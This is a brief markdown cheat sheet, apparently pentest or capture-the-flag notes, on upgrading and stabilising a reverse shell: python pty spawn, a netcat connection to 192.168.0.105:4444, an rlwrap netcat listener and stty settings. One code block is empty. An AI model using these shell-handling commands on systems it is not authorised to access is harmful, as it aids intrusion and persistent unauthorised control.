# Linux

- Step one
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

- Step two
give us access to term commands 
```

```

- Step three
turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). 
It then foregrounds the shell, thus completing the process.
```
stty raw -echo; fg0
```

```
1) nc -nv 192.168.0.105 4444
2) python -c 'import pty;pty.spawn("/bin/bash")'
3) export TERM=xterm
4) ctr + z
5) stty raw -echo; fg
```

# Windows
- Step one
```
sudo apt install rlwrap
```

- Step two
```
rlwrap nc -lvnp 4444
```

# Change terminal tty size
- Step one
This will give you a large stream of output.
```
stty -a
```
- step two
This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information 
being accurate to correctly open.
```
stty rows <number>
stty cols <number>
```
